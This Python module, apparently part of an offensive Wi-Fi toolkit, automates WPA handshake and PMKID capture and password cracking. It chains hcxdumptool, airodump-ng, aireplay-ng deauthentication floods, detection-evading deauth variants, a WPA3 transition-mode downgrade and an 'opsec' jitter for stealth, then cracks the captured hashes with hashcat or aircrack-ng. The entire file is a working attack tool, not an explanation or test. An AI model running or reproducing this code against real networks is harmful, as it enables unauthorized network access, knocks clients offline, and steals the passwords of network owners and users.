"""Attack module — WPA handshake/PMKID capture and cracking."""

from __future__ import annotations

import os
import signal
import subprocess
import time
from dataclasses import dataclass
from enum import Enum

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

from ..core.config import Config
from ..core.logger import get_logger
from ..core.opsec import OpsecEngine

console = Console()
log = get_logger("attack")


class AttackStrategy(Enum):
    PMKID = "pmkid"
    PASSIVE = "passive"
    DEAUTH = "deauth"
    DEAUTH_EVASION = "deauth_evasion"
    WPA3_DOWNGRADE = "wpa3_downgrade"


@dataclass
class CaptureResult:
    success: bool
    strategy: AttackStrategy
    capture_file: str | None = None
    hash_file: str | None = None
    message: str = ""


@dataclass
class CrackResult:
    success: bool
    password: str | None = None
    method: str = ""
    message: str = ""


class AttackModule:
    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec

    def select_strategy(
        self,
        pmf_info: dict | None = None,
        wpa3_info: dict | None = None,
        evasion: bool = False,
    ) -> list[AttackStrategy]:
        strategies = []

        if wpa3_info and wpa3_info.get("transition_mode"):
            strategies.append(AttackStrategy.WPA3_DOWNGRADE)
            console.print("[yellow]WPA3 transition mode — downgrade attack queued[/yellow]")

        if wpa3_info and wpa3_info.get("sae_only"):
            console.print(
                "[red]SAE-only AP — standard WPA2 capture/crack will not work. "
                "Use wpa3 timing/group commands instead.[/red]"
            )
            return strategies if strategies else [AttackStrategy.PMKID]

        strategies.append(AttackStrategy.PMKID)
        strategies.append(AttackStrategy.PASSIVE)

        if self.config.stealth.deauth_allowed:
            if pmf_info and pmf_info.get("pmf_required"):
                console.print(
                    "[red]PMF required on target — skipping deauth strategy "
                    "(802.11w blocks unauthenticated management frames)[/red]"
                )
                log.info("Deauth skipped: PMF required on target")
            elif pmf_info and pmf_info.get("pmf_capable"):
                console.print(
                    "[yellow]PMF capable on target — deauth may fail for PMF-enabled clients[/yellow]"
                )
                if evasion:
                    strategies.append(AttackStrategy.DEAUTH_EVASION)
                strategies.append(AttackStrategy.DEAUTH)
            else:
                if evasion:
                    strategies.append(AttackStrategy.DEAUTH_EVASION)
                else:
                    strategies.append(AttackStrategy.DEAUTH)

        console.print(
            f"[dim]Strategy order: "
            f"{' → '.join(s.value for s in strategies)}[/dim]"
        )
        return strategies

    def capture(
        self, interface: str, bssid: str, channel: int,
        client_mac: str | None = None,
        output_dir: str = "./captures",
        pmf_info: dict | None = None,
        wpa3_info: dict | None = None,
        evasion: bool = False,
    ) -> CaptureResult:
        os.makedirs(output_dir, exist_ok=True)
        self.opsec.pre_operation()

        strategies = self.select_strategy(
            pmf_info=pmf_info, wpa3_info=wpa3_info, evasion=evasion,
        )
        for strategy in strategies:
            console.print(f"[cyan]Trying {strategy.value}...[/cyan]")

            if strategy == AttackStrategy.PMKID:
                result = self._capture_pmkid(interface, bssid, channel, output_dir)
            elif strategy == AttackStrategy.PASSIVE:
                result = self._capture_passive(interface, bssid, channel, output_dir)
            elif strategy == AttackStrategy.DEAUTH:
                result = self._capture_deauth(
                    interface, bssid, channel, client_mac, output_dir,
                )
            elif strategy == AttackStrategy.DEAUTH_EVASION:
                result = self._capture_deauth_evasion(
                    interface, bssid, channel, client_mac, output_dir,
                )
            elif strategy == AttackStrategy.WPA3_DOWNGRADE:
                result = self._capture_wpa3_downgrade(
                    interface, bssid, channel, client_mac, output_dir,
                )
            else:
                continue

            if result.success:
                console.print(f"[green]Capture successful via {strategy.value}![/green]")
                result = self._auto_export_hash(result, output_dir)
                return result

            console.print(f"[yellow]{strategy.value} failed, trying next...[/yellow]")
            self.opsec.jitter(2.0)

        return CaptureResult(success=False, strategy=strategies[-1], message="All strategies exhausted")

    def _auto_export_hash(self, result: CaptureResult, output_dir: str) -> CaptureResult:
        """Auto-convert capture to hashcat formats (hc22000 + hccapx) if not already done."""
        if result.hash_file:
            return result

        if not result.capture_file or not os.path.exists(result.capture_file):
            return result

        cap = result.capture_file
        base = os.path.splitext(cap)[0]

        hc22000_path = f"{base}.hc22000"
        try:
            conv = subprocess.run(
                ["hcxpcapngtool", "-o", hc22000_path, cap],
                capture_output=True, text=True, timeout=30,
            )
            if conv.returncode == 0 and os.path.exists(hc22000_path) and os.path.getsize(hc22000_path) > 0:
                result.hash_file = hc22000_path
                console.print(f"[green]Hash exported: {hc22000_path}[/green]")
                log.info("Auto-exported hc22000: %s", hc22000_path)
            else:
                console.print("[dim]hcxpcapngtool: no hashes extracted[/dim]")
        except FileNotFoundError:
            console.print("[dim]hcxpcapngtool not found — skipping hc22000 export[/dim]")
        except subprocess.TimeoutExpired:
            pass

        hccapx_path = f"{base}.hccapx"
        try:
            conv = subprocess.run(
                ["hcxpcapngtool", "--hccapx", hccapx_path, cap],
                capture_output=True, text=True, timeout=30,
            )
            if conv.returncode == 0 and os.path.exists(hccapx_path) and os.path.getsize(hccapx_path) > 0:
                console.print(f"[green]Legacy hash exported: {hccapx_path}[/green]")
                log.info("Auto-exported hccapx: %s", hccapx_path)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        return result

    def _capture_pmkid(
        self, interface: str, bssid: str, channel: int, output_dir: str,
    ) -> CaptureResult:
        outfile = os.path.join(output_dir, f"pmkid_{bssid.replace(':', '')}.pcapng")

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            TimeElapsedColumn(), console=console,
        ) as progress:
            progress.add_task("PMKID capture (waiting for response)...", total=None)

            proc = subprocess.Popen(
                ["sudo", "hcxdumptool",
                 "-i", interface,
                 "-o", outfile,
                 f"--filterlist_ap={bssid}",
                 "--filtermode=2",
                 "--enable_status=1"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            time.sleep(30)
            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

        if not os.path.exists(outfile) or os.path.getsize(outfile) == 0:
            return CaptureResult(
                success=False, strategy=AttackStrategy.PMKID,
                message="No PMKID captured",
            )

        hash_file = os.path.join(output_dir, f"pmkid_{bssid.replace(':', '')}.hc22000")
        result = subprocess.run(
            ["hcxpcapngtool", "-o", hash_file, outfile],
            capture_output=True, text=True,
        )

        if result.returncode == 0 and os.path.exists(hash_file):
            return CaptureResult(
                success=True, strategy=AttackStrategy.PMKID,
                capture_file=outfile, hash_file=hash_file,
            )

        return CaptureResult(
            success=False, strategy=AttackStrategy.PMKID,
            message="PMKID conversion failed",
        )

    def _capture_passive(
        self, interface: str, bssid: str, channel: int, output_dir: str,
        timeout: int = 120,
    ) -> CaptureResult:
        prefix = os.path.join(output_dir, f"passive_{bssid.replace(':', '')}")

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            TimeElapsedColumn(), console=console,
        ) as progress:
            progress.add_task(
                f"Passive capture (waiting {timeout}s for handshake)...", total=None,
            )

            proc = subprocess.Popen(
                ["sudo", "airodump-ng",
                 "-c", str(channel),
                 "--bssid", bssid,
                 "-w", prefix,
                 interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            start = time.time()
            while time.time() - start < timeout:
                time.sleep(5)
                cap_file = f"{prefix}-01.cap"
                if os.path.exists(cap_file):
                    check = subprocess.run(
                        ["aircrack-ng", cap_file],
                        capture_output=True, text=True,
                    )
                    if "1 handshake" in check.stdout:
                        proc.send_signal(signal.SIGINT)
                        try:
                            proc.wait(timeout=5)
                        except subprocess.TimeoutExpired:
                            proc.kill()
                            proc.wait()
                        return CaptureResult(
                            success=True, strategy=AttackStrategy.PASSIVE,
                            capture_file=cap_file,
                        )

            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

        return CaptureResult(
            success=False, strategy=AttackStrategy.PASSIVE,
            message="No handshake captured within timeout",
        )

    def _capture_deauth(
        self, interface: str, bssid: str, channel: int,
        client_mac: str | None, output_dir: str,
    ) -> CaptureResult:
        prefix = os.path.join(output_dir, f"deauth_{bssid.replace(':', '')}")

        dump_proc = subprocess.Popen(
            ["sudo", "airodump-ng",
             "-c", str(channel),
             "--bssid", bssid,
             "-w", prefix,
             interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(3)

        deauth_count = self.config.stealth.deauth_max_packets
        deauth_cmd = [
            "sudo", "aireplay-ng",
            "-0", str(deauth_count),
            "-a", bssid,
        ]
        if client_mac:
            deauth_cmd.extend(["-c", client_mac])
        deauth_cmd.append(interface)

        console.print(
            f"[yellow]Sending {deauth_count} deauth packets"
            f"{f' to {client_mac}' if client_mac else ' (broadcast)'}[/yellow]"
        )
        subprocess.run(deauth_cmd, capture_output=True)

        self.opsec.jitter(5.0)

        time.sleep(15)
        dump_proc.send_signal(signal.SIGINT)
        try:
            dump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump_proc.kill()
            dump_proc.wait()

        cap_file = f"{prefix}-01.cap"
        if os.path.exists(cap_file):
            check = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True, text=True,
            )
            if "1 handshake" in check.stdout:
                return CaptureResult(
                    success=True, strategy=AttackStrategy.DEAUTH,
                    capture_file=cap_file,
                )

        return CaptureResult(
            success=False, strategy=AttackStrategy.DEAUTH,
            message="Deauth sent but no handshake captured",
        )

    def _capture_deauth_evasion(
        self, interface: str, bssid: str, channel: int,
        client_mac: str | None, output_dir: str,
    ) -> CaptureResult:
        from .packets import deauth_evasion

        prefix = os.path.join(output_dir, f"evasion_{bssid.replace(':', '')}")

        dump_proc = subprocess.Popen(
            ["sudo", "airodump-ng",
             "-c", str(channel),
             "--bssid", bssid,
             "-w", prefix,
             interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(3)

        target = client_mac or "ff:ff:ff:ff:ff:ff"
        for method in ("randomized", "disassoc", "mixed"):
            deauth_evasion(
                interface, target, bssid,
                count=self.config.stealth.deauth_max_packets,
                method=method,
                rate_limit=5.0,
            )
            self.opsec.jitter(3.0)

            cap_file = f"{prefix}-01.cap"
            if os.path.exists(cap_file):
                check = subprocess.run(
                    ["aircrack-ng", cap_file],
                    capture_output=True, text=True,
                )
                if "1 handshake" in check.stdout:
                    dump_proc.send_signal(signal.SIGINT)
                    try:
                        dump_proc.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        dump_proc.kill()
                        dump_proc.wait()
                    return CaptureResult(
                        success=True, strategy=AttackStrategy.DEAUTH_EVASION,
                        capture_file=cap_file,
                    )

        dump_proc.send_signal(signal.SIGINT)
        try:
            dump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump_proc.kill()
            dump_proc.wait()

        return CaptureResult(
            success=False, strategy=AttackStrategy.DEAUTH_EVASION,
            message="Evasive deauth sent but no handshake captured",
        )

    def _capture_wpa3_downgrade(
        self, interface: str, bssid: str, channel: int,
        client_mac: str | None, output_dir: str,
    ) -> CaptureResult:
        from .wpa3 import Wpa3Module

        wpa3 = Wpa3Module(self.config, self.opsec)
        result = wpa3.transition_downgrade(
            interface, bssid, channel,
            client_mac=client_mac,
            output_dir=output_dir,
        )

        if result.success and result.capture_file:
            return CaptureResult(
                success=True,
                strategy=AttackStrategy.WPA3_DOWNGRADE,
                capture_file=result.capture_file,
            )

        return CaptureResult(
            success=False,
            strategy=AttackStrategy.WPA3_DOWNGRADE,
            message=result.message,
        )

    def crack(self, capture: CaptureResult) -> CrackResult:
        if not capture.success:
            return CrackResult(success=False, message="No capture to crack")

        if capture.hash_file and self.config.use_hashcat:
            result = self._crack_hashcat(capture.hash_file)
            if result.success:
                return result

        if capture.capture_file:
            return self._crack_aircrack(capture.capture_file)

        return CrackResult(success=False, message="No suitable file for cracking")

    def _crack_hashcat(self, hash_file: str) -> CrackResult:
        console.print("[cyan]Cracking with hashcat (GPU)...[/cyan]")

        result = subprocess.run(
            ["hashcat",
             "-m", str(self.config.hashcat_mode),
             hash_file,
             self.config.wordlist,
             "--force",
             "--quiet"],
            capture_output=True, text=True,
        )

        if result.returncode == 0:
            show = subprocess.run(
                ["hashcat",
                 "-m", str(self.config.hashcat_mode),
                 hash_file, "--show"],
                capture_output=True, text=True,
            )
            if show.stdout.strip():
                password = show.stdout.strip().split(":")[-1]
                return CrackResult(
                    success=True, password=password, method="hashcat",
                )

        return CrackResult(success=False, method="hashcat", message="Hashcat exhausted wordlist")

    def _crack_aircrack(self, cap_file: str) -> CrackResult:
        console.print("[cyan]Cracking with aircrack-ng (CPU)...[/cyan]")

        result = subprocess.run(
            ["aircrack-ng",
             "-w", self.config.wordlist,
             "-q",
             cap_file],
            capture_output=True, text=True,
        )

        if "KEY FOUND!" in result.stdout:
            for line in result.stdout.split("\n"):
                if "KEY FOUND!" in line:
                    try:
                        password = line.split("[")[1].split("]")[0].strip()
                    except IndexError:
                        password = line.split("KEY FOUND!")[-1].strip().strip("[]")
                    return CrackResult(
                        success=True, password=password, method="aircrack-ng",
                    )

        return CrackResult(
            success=False, method="aircrack-ng",
            message="Aircrack exhausted wordlist",
        )
